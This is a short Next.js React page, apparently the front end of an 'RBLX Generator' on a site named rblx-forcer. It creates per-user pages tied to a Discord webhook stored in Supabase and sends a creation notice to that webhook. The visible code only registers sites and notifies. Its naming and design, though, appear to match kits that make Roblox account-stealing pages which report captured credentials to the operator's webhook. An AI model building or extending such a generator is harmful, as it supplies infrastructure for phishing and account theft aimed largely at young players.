"use client";
import { useState } from "react";
import { supabase } from "../supabaseClient";

export default function HomePage() {
  const [directory, setDirectory] = useState("");
  const [webhook, setWebhook] = useState("");
  const [status, setStatus] = useState("");

  const handleGenerate = async () => {
    if (!directory || !webhook) {
      setStatus("⚠️ Please enter both a directory and webhook URL");
      return;
    }

    setStatus("⏳ Creating site...");

    // Insert new record in Supabase
    const { data, error } = await supabase
      .from("websites")
      .insert([{ directory, webhook_url: webhook }]);

    if (error) {
      setStatus("❌ Error: " + error.message);
      return;
    }

    // Send Discord webhook message
    try {
      await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `✅ Your site **${directory}** has been successfully created!\n🌐 Visit it here: https://rblx-forcer.vercel.app/${directory}`,
        }),
      });
    } catch (err) {
      console.error("Webhook send failed", err);
    }

    // Redirect user to their page
    window.location.href = `/${directory}`;
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-blue-500 to-purple-600 text-white">
      <h1 className="text-3xl font-bold mb-6">RBLX Generator</h1>

      <div className="bg-white/10 p-6 rounded-2xl shadow-xl w-80 flex flex-col gap-3">
        <input
          value={directory}
          onChange={(e) => setDirectory(e.target.value)}
          placeholder="Enter directory name"
          className="px-3 py-2 rounded bg-white/20 text-white placeholder-gray-300"
        />
        <input
          value={webhook}
          onChange={(e) => setWebhook(e.target.value)}
          placeholder="Enter Discord Webhook URL"
          className="px-3 py-2 rounded bg-white/20 text-white placeholder-gray-300"
        />
        <button
          onClick={handleGenerate}
          className="bg-white text-blue-700 font-semibold px-4 py-2 rounded-lg hover:bg-blue-200 transition"
        >
          Generate
        </button>

        {status && <p className="text-center mt-3">{status}</p>}
      </div>
    </div>
  );
    }
